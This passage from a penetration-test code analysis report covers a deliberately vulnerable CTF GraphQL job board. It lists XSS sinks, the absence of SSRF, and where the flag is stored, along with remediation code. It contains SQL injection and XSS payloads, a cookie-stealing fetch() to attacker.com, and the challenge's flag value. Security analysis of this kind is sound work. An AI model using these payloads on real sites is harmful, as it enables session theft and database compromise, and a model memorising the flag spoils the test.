**NOTE:** No middleware or input validation files exist. The Starlette application is initialized with zero middleware (no CORS, CSRF, rate limiting, session management, or authentication middleware).

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (line 87)**  
  Starlette application initialization with no middleware: `app = Starlette(routes=routes)`

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (line 51)**  
  GraphQL parameter definition with type hint but no validation: `job_type: str = ""`

### Logging & Monitoring

**NOTE:** No logging or monitoring infrastructure exists. No log configuration files, no monitoring agent configurations, no metrics exporters.

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/docker-compose.yml` (lines 9-13)**  
  Docker health check configuration (only binary up/down status, no detailed metrics)

### Infrastructure & Deployment

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/docker-compose.yml`**  
  Complete container orchestration configuration with build context, port exposure (80), and health checks

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/Dockerfile`**  
  Complete container build process: base image (python:3.12), dependency installation, file copying, flag injection, server command

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/Makefile`**  
  Build automation referencing external `../common.mk` (not in scope for analysis)

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (line 92)**  
  Uvicorn server configuration: `uvicorn.run(app, host="0.0.0.0", port=8000)`

**NOTE:** No infrastructure-as-code files for security headers exist (no nginx.conf, no Kubernetes Ingress with header annotations, no Traefik configuration)

### CTF Flag Storage

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/.env` (line 1)**  
  **PRIMARY FLAG SOURCE:** `FLAG="flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}"`

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/flag.txt`**  
  Flag embedded in container image at `/app/flag.txt` after build-time `sed` substitution

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (line 34)**  
  Flag stored in SQLite database: `jobs.description` field where `jobs.type='private'`

- **Runtime Database File:** `test.db` (created at runtime in `/app/test.db`, contains flag in jobs table)

---

## 9. XSS Sinks and Render Contexts

**Network Surface Focus:** This analysis includes only XSS sinks in network-accessible web pages served by the application (`/` endpoint serving `index.html`). The following are excluded as out-of-scope: build scripts, local development files, and any code not served via HTTP.

### XSS Sink 1: Error Message Rendering via innerHTML

**Sink Type:** DOM-based Cross-Site Scripting (XSS)  
**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/static/index.html`  
**Line Numbers:** 61-65

**Vulnerable Code:**
```javascript
if (json.errors) {
    const errorMessages = json.errors.map(error => error.message).join(', ');
    resultDiv.innerHTML = `
        <div class="alert alert-danger" role="alert">
            Error: ${errorMessages}
        </div>
    `;
}
```

**Render Context:** HTML Body Context

The error messages are rendered directly into the DOM using `innerHTML`, which interprets the content as HTML rather than plain text. If `errorMessages` contains HTML tags or JavaScript event handlers, they will be parsed and executed.

**User Input Source:** GraphQL error responses from the server

**Data Flow:**
1. User sends malicious GraphQL query via `jobType` parameter (line 40)
2. Backend processes query and generates exception (e.g., SQL syntax error)
3. Strawberry GraphQL framework includes error details in response
4. Frontend receives `json.errors` array (line 59)
5. Error messages are extracted using `.map(error => error.message)` (line 61)
6. Messages are concatenated with `, ` delimiter (line 61)
7. Concatenated string is interpolated into template literal (lines 62-65)
8. **Template literal assigned to `innerHTML`** → HTML parsing and script execution

**Exploitability:** MEDIUM to HIGH

**Attack Vector 1: SQL Injection → XSS Chain**

An attacker can craft a SQL injection payload that triggers a database error containing malicious HTML/JavaScript. Example:

```graphql
query {
  jobs(jobType: "' UNION SELECT 1,'<img src=x onerror=alert(document.cookie)>','xss','payload' --") {
    id name type description
  }
}
```

If the SQLite error message echoes back the malicious SQL (common in development environments), the error message would contain:
```
Error: near "UNION SELECT 1,'<img src=x onerror=alert(document.cookie)>','xss','payload'": syntax error
```

When rendered via `innerHTML`, the `<img>` tag would execute the `onerror` handler, triggering arbitrary JavaScript.

**Attack Vector 2: Backend Exception Manipulation**

If the backend includes user input in exception messages (which line 57 does not, but future code might), reflected XSS is possible:

```python
# Hypothetical vulnerable code:
raise Exception(f"Invalid job type: {job_type}")
```

With `job_type = "<script>alert('XSS')</script>"`, the error message becomes:
```
Error: Invalid job type: <script>alert('XSS')</script>
```

Rendered via `innerHTML` → script execution.

**Current Application Risk:** MEDIUM

The current code at line 57 (`raise Exception("Only admins can see private jobs")`) uses a static error message with no user input interpolation, limiting immediate exploitability. However, SQL syntax errors or other exceptions might include user-controlled data.

**Secure Remediation:**
```javascript
// Use textContent instead of innerHTML to prevent HTML parsing
if (json.errors) {
    const errorMessages = json.errors.map(error => error.message).join(', ');
    const errorDiv = document.createElement('div');
    errorDiv.className = 'alert alert-danger';
    errorDiv.setAttribute('role', 'alert');
    errorDiv.textContent = `Error: ${errorMessages}`;  // Safe: text-only
    resultDiv.innerHTML = '';
    resultDiv.appendChild(errorDiv);
}
```

### XSS Sink 2: Job Data Rendering via innerHTML

**Sink Type:** Stored Cross-Site Scripting (XSS)  
**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/static/index.html`  
**Line Numbers:** 84-94, 96

**Vulnerable Code:**
```javascript
data.forEach(job => {
    jobsTable += `
        <tr>
            <td>${job.id}</td>
            <td>${job.name}</td>
            <td>${job.type}</td>
            <td>${job.description}</td>
        </tr>
    `;
});
jobsTable += '</tbody></table>';
resultDiv.innerHTML = jobsTable;  // Line 96: Unsafe assignment
```

**Render Context:** HTML Table Cell Context

Each job field (`id`, `name`, `type`, `description`) is interpolated into a template literal that constructs HTML table rows. The final concatenated string is assigned to `innerHTML`, enabling HTML and JavaScript execution if any job field contains malicious content.

**User Input Source:** Database content retrieved via GraphQL API

**Data Flow:**
1. Attacker injects malicious HTML/JavaScript into database via SQL injection
2. GraphQL API queries database and retrieves poisoned data
3. Strawberry GraphQL serializes data to JSON (no escaping)
4. Frontend receives JSON with malicious content in job fields (line 77)
5. `data.forEach()` loop iterates over jobs (line 84)
6. Template literals interpolate `${job.name}`, `${job.description}`, etc. (lines 86-89)
7. Malicious HTML concatenated into `jobsTable` string (lines 84-92)
8. **`resultDiv.innerHTML = jobsTable`** (line 96) → HTML parsing and script execution

**Exploitability:** HIGH

This is a **Stored XSS vulnerability** that combines with the SQL injection vulnerability to create a powerful attack chain:

**Attack Scenario:**

**Step 1: Inject Malicious JavaScript into Database**
```graphql
mutation {
  # Note: This application has no mutations, so SQL injection is the only path
}
```

Using SQL injection via the `jobType` parameter:
```graphql
query {
  jobs(jobType: "' OR 1=1; UPDATE jobs SET name='<img src=x onerror=alert(document.cookie)>' WHERE type='front-end'; --") {
    id name type description
  }
}
```

SQLite may not support multi-statement injection (`UPDATE` after `SELECT`), but UNION-based injection can insert malicious data:
```graphql
query {
  jobs(jobType: "' UNION SELECT 999,'<img src=x onerror=alert(1)>','xss','stored' --") {
    id name type description
  }
}
```

**Step 2: Victim Loads Page**

When any user (including an admin) views the job listings, the injected HTML is rendered:
```html
<tr>
    <td>999</td>
    <td><img src=x onerror=alert(1)></td>  <!-- XSS EXECUTES HERE -->
    <td>xss</td>
    <td>stored</td>
</tr>
```

The `<img>` tag's `onerror` handler fires immediately (since `src=x` is invalid), executing `alert(1)`. In a real attack, this would be replaced with:
```javascript
onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)"
```

**Current Application Risk:** HIGH

The application **lacks any output encoding or HTML escaping** for database values. Every field rendered via `innerHTML` is a potential XSS vector. The combination with SQL injection makes this a **critical vulnerability chain**.

**Specific Field Risks:**

- **`job.id`** (line 86): Numeric field, low XSS risk (SQL injection could return non-numeric values)
- **`job.name`** (line 87): Text field, **HIGH XSS RISK** if contains HTML
- **`job.type`** (line 88): Text field, **MEDIUM RISK** (limited to "front-end", "back-end", "private" in seed data)
- **`job.description`** (line 89): Text field, **CRITICAL RISK** (contains flag for private jobs, could contain XSS payload)

**Secure Remediation:**
```javascript
// Option 1: Use textContent for each cell (safest)
data.forEach(job => {
    const row = document.createElement('tr');
    ['id', 'name', 'type', 'description'].forEach(field => {
        const cell = document.createElement('td');
        cell.textContent = job[field];  // Safe: text-only, no HTML parsing
        row.appendChild(cell);
    });
    tableBody.appendChild(row);
});

// Option 2: HTML-escape values before interpolating
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

data.forEach(job => {
    jobsTable += `
        <tr>
            <td>${escapeHtml(String(job.id))}</td>
            <td>${escapeHtml(job.name)}</td>
            <td>${escapeHtml(job.type)}</td>
            <td>${escapeHtml(job.description)}</td>
        </tr>
    `;
});
```

### XSS Sink 3: GraphQL Query Construction (Indirect)

**Sink Type:** GraphQL Injection → SQL Injection (not direct XSS, but related)  
**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/static/index.html`  
**Line Numbers:** 39-48

**Code:**
```javascript
const jobType = document.getElementById('job-type').value;
const query = `
    query {
        jobs(jobType: "${jobType}") {
            id
            name
            type
            description
        }
    }
`;
```

**Render Context:** N/A (not rendered in browser DOM, but sent to server)

**Analysis:** While this is **not a direct XSS sink**, it's a **GraphQL injection point** that feeds into the SQL injection vulnerability (XSS Sink 1 and 2's attack chain enabler).

The `jobType` value from the dropdown is interpolated into the GraphQL query string without escaping. Although the dropdown limits client-side options, an attacker can:
1. Modify the dropdown via browser DevTools
2. Intercept and modify the HTTP request
3. Send crafted requests directly via curl/Postman

This enables the SQL injection documented in Section 9 (SQL Injection Sinks).

**Not Classified as XSS:** This sink does not execute JavaScript in the browser (it's a string sent to the server), so it's excluded from the XSS sink count but documented for completeness.

### Summary: XSS Sinks Inventory

| # | Sink Location | Lines | Sink Function | Render Context | Risk Level | Network Accessible |
|---|---------------|-------|---------------|----------------|------------|-------------------|
| 1 | index.html | 61-65 | `innerHTML` (error messages) | HTML Body | MEDIUM | Yes |
| 2 | index.html | 84-96 | `innerHTML` (job data table) | HTML Table Cells | HIGH | Yes |

**Total XSS Sinks Found:** 2 (both exploitable, both network-accessible)

**No XSS Sinks Found In:**
- ❌ JavaScript Context (`eval()`, `Function()`, `setTimeout()` with strings): None detected
- ❌ URL Context (`window.location` assignments with user input): None detected  
- ❌ CSS Context (dynamic `style` properties with user input): None detected
- ❌ jQuery Sinks (`append()`, `html()`, `prepend()`): jQuery not used in application

**Out-of-Scope (Not Network Accessible):**
- Build scripts, Docker configuration, backend Python code (not rendered in browser)

---

## 10. SSRF Sinks

**Network Surface Focus:** Only SSRF sinks in network-accessible application code (GraphQL resolvers, HTTP handlers) are in scope. Build scripts, CLI tools, and local-only utilities are excluded.

### Finding: NO SSRF SINKS DETECTED

**Comprehensive Analysis Result:** After exhaustive source code analysis, **zero Server-Side Request Forgery (SSRF) vulnerabilities** were identified in this application.

**Rationale:** The application's architecture is **purely inbound request-processing** with **no outbound HTTP requests** or network operations. The application:

1. **Receives HTTP requests** (client → server)
2. **Queries local SQLite database** (no network requests)
3. **Returns HTTP responses** (server → client)

There are **no code paths** where user input could influence the server to make outbound requests to external or internal resources.

### Detailed Absence Analysis

**HTTP(S) Client Libraries:** NONE IMPORTED

Comprehensive search of Python imports reveals **zero HTTP client libraries**:

```python
# File: /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py
import sqlite3           # Local database only
from typing import List  # Type hints
import strawberry        # GraphQL framework
from starlette.applications import Starlette
from starlette.responses import HTMLResponse
from starlette.routing import Route, Mount
from strawberry.asgi import GraphQL
from strawberry.types import Info
```

**Absent HTTP Libraries:**
- ❌ `requests` - Not imported
- ❌ `urllib`, `urllib2`, `urllib3` - Not imported
- ❌ `http.client`, `httplib` - Not imported
- ❌ `aiohttp`, `httpx` - Not imported (async HTTP clients)
- ❌ `pycurl` - Not imported

**Raw Sockets & Network Operations:** NONE DETECTED

Search for socket operations reveals **zero network code**:
- ❌ `socket.socket()` - Not used
- ❌ `socket.connect()` - Not used
- ❌ `asyncio` network operations - Not used

**URL Openers & File Includes:** LOCAL FILES ONLY

File operations are limited to **local filesystem access with hardcoded paths**:

**File Operation 1** (`main.py`, **lines 19-20**):
```python
with open("flag.txt") as f:
    flag = f.read()
```
- **Path:** Hardcoded `"flag.txt"` (no user input)
- **SSRF Risk:** NONE (local file, no URL handling)

**File Operation 2** (`main.py`, **lines 72-73**):
```python
with open("static/index.html") as f:
    return HTMLResponse(content=f.read(), status_code=200)
```
- **Path:** Hardcoded `"static/index.html"` (no user input)
- **SSRF Risk:** NONE (local file, no URL handling)

**No Dynamic File Paths:** Both `open()` calls use **string literals** with no user input, variables, or parameter interpolation. There's no way for an attacker to influence which file is read.

**Redirect & "Next URL" Handlers:** NONE DETECTED

The application has **no redirect functionality**:
- ❌ No `response.redirect()` calls
- ❌ No `Location` headers set
- ❌ No "next", "return_url", "redirect_to" parameters processed
- ❌ No HTTP 3xx status codes returned

All endpoints return direct responses (HTML content or GraphQL JSON), never redirects.

**Headless Browsers & Render Engines:** NONE DETECTED

Search for browser automation libraries reveals **zero usage**:
- ❌ `puppeteer`, `pyppeteer` - Not imported
- ❌ `playwright` - Not imported
- ❌ `selenium` - Not imported
- ❌ `wkhtmltopdf` - Not present

**Media Processors:** NONE DETECTED

No image, video, or document processing libraries:
- ❌ `PIL`, `Pillow` - Not imported
- ❌ `ImageMagick`, `wand` - Not present
- ❌ `ffmpeg` - Not present
- ❌ PDF processors - None detected

**Link Preview & Unfurlers:** NONE DETECTED

No URL metadata extraction or link preview functionality:
- ❌ No oEmbed endpoint fetching
- ❌ No Open Graph tag scraping
- ❌ No URL preview generation

**Webhook Testers & Callback Verifiers:** NONE DETECTED

No outbound webhook or callback functionality:
- ❌ No "ping webhook" endpoints
- ❌ No callback URL verification
- ❌ No outbound notification systems

**SSO/OIDC Discovery & JWKS Fetchers:** NONE DETECTED

No OAuth, OIDC, or SSO integrations:
- ❌ No JWKS (JSON Web Key Set) fetching
- ❌ No OAuth discovery endpoints
- ❌ No SAML metadata retrieval
- ❌ No identity provider integration

**Importers & Data Loaders:** NONE DETECTED

No "import from URL" functionality:
- ❌ No CSV/JSON/XML remote fetching
- ❌ No RSS/Atom feed readers
- ❌ No remote configuration loading

**Package/Plugin Installers:** NONE DETECTED

No dynamic package installation:
- ❌ No "install from URL" features
- ❌ No remote plugin downloading
- ❌ No package manager integrations

**Monitoring & Health Check Frameworks:** LOCAL ONLY

The `/ping` health check endpoint (lines 76-77) returns a static string with **no outbound requests**:
```python
async def ping(_):
    return HTMLResponse(content="pong", status_code=200)
```

**Cloud Metadata Helpers:** NONE DETECTED

No cloud provider metadata access:
- ❌ No AWS EC2 metadata queries (`http://169.254.169.254`)
- ❌ No GCP metadata server access
- ❌ No Azure instance metadata service calls

### Architectural SSRF Immunity

The application is **architecturally immune to SSRF** due to its design:

1. **No External Service Dependencies:** The application relies only on an embedded SQLite database (local file, no network)
2. **No Service Mesh Communication:** Single-process monolith with no inter-service communication
3. **No Outbound API Calls:** No integration with payment processors, email services, analytics platforms, etc.
4. **No User-Controlled URLs:** No GraphQL fields, query parameters, or API inputs accept URL values

**Database Operations:** All database operations are **local SQLite queries** via the `sqlite3` module, which accesses a local file (`test.db`) without network sockets.

**GraphQL API:** The only GraphQL query (`jobs`) accepts a `jobType: String` parameter, which is used in SQL queries (SQL injection vulnerability) but **never as a URL or network destination**.

### Conclusion: Zero SSRF Attack Surface

**FINDING:** This application has **NO SSRF VULNERABILITIES** and **NO SSRF ATTACK SURFACE**.

**Rationale Summary:**
- **Zero HTTP client libraries** imported or used
- **Zero network socket operations** beyond listening for inbound HTTP (handled by Uvicorn)
- **Zero outbound network requests** in the application logic
- **Zero user-controlled URL parameters** that could influence server-side requests
- **Local-only file operations** with hardcoded paths

**Security Implication:** While the absence of SSRF vulnerabilities is positive from that specific vulnerability class perspective, it also means the application has **no external integrations** where additional security controls could be evaluated (API authentication, webhook signature verification, TLS certificate validation, etc.).

**Out-of-Scope Analysis:** Build-time operations (Docker build pulling base images, pip installing packages) involve network requests, but these are **not triggered by user input** or **runtime application behavior**, so they are excluded from the network-accessible attack surface per the scope definition.

---

**END OF PENETRATION TEST CODE ANALYSIS REPORT**

This report provides comprehensive intelligence for the subsequent reconnaissance and vulnerability analysis phases of the security assessment workflow. The primary attack vector is SQL injection via the GraphQL `jobType` parameter, enabling flag extraction from the database.

## Authenticated Scans

### SCHEMATHESIS
Status: skipped
No API schemas found

---
Report generated at: 2025-10-31T04:03:17.799Z